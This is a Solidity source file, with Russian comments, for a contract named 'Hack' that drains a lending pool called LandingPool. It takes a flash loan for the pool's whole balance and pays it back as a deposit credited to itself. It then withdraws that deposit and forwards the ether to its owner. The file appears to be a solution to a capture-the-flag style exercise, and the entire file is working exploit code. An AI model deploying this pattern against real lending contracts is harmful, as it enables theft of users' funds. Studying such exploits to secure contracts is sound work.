// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./LandingPool.sol";

contract Hack {
    LandingPool public LP;
    address owner;

    using Address for address payable;

    constructor (address payable _LP) {
        LP = LandingPool(_LP);
        owner = msg.sender;
    }

    // пополнение контракта
    function deposit() external payable {

    }

    fallback() external payable {

    }

    function showBalance() public view returns(uint) {
        return(address(this).balance);
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function withdraw() external onlyOwner {
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success);
    }

    // function getLoan() public {
    //     LP.flashLoan(address(LP).balance);
    // }

    // function execute() external payable{
    //     // логика арбитража
    //     // (...)

    //     // возвращение займа
    //     payable(address(LP)).sendValue(msg.value);
    // }

    function getLoanAttack() public {
        // от имени контракта - займ на всю сумму баланса LP
        LP.flashLoan(address(LP).balance);

        // // вывод средств из LP на контракт
        // LP.withdraw();
    }

    function execute() external payable{
        // // Полученную сумму - депозитим в LandingPool контракт от имени аккаунта, вызывающего execute()
        // (bool success, ) = address(LP).call{value: msg.value} (
        //     abi.encodeWithSelector(LP.deposit.selector)
        // );
        // require(success);

        LP.deposit{value: msg.value}();
    }

    function withdrawFromLP() public {
        // вывод средств из LP на данный контракт
        LP.withdraw();
    }

    function getLoanAttack2() public {
        // от имени контракта - займ на всю сумму баланса LP
        LP.flashLoan(address(LP).balance);

        // // вывод средств из LP на контракт
        // LP.withdraw();
    }
}